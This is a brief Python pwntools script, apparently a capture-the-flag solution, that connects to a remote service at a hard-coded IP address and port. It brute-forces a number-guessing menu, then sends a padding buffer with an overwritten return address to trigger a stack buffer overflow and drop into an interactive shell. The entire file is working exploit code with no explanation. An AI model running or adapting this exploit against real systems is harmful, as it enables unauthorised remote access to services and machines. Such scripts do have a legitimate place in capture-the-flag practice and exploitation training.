from pwn import remote

target = remote("65.109.185.193", 5000)

def check_match(line):
    if line.strip().startswith(b'Congratulations!'):
        line = target.recvuntil(b'What do you want to save as history for your calculation?')
        return True
    line = target.recvline()
    print(line)
    return False

def reach_buffer():
    while True:
        line = target.recvuntil(b'3- Exit')
        target.sendline(b'2')
        line = target.recvuntil(b'Guess the number (between 1 and 10) so I give you a shell:')
        target.sendline(b'1')
        line = target.recvline()
        print(line)
        if check_match(line): return
        for i in range(2):
            target.sendline(f'{i+2}'.encode())
            line = target.recvline()
            print(line)
            if check_match(line): return

reach_buffer()
garbage = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
ret_addr = b"\xc7\x12\x40\x00"
target.sendline(garbage + ret_addr)
line = target.recvline()
target.interactive()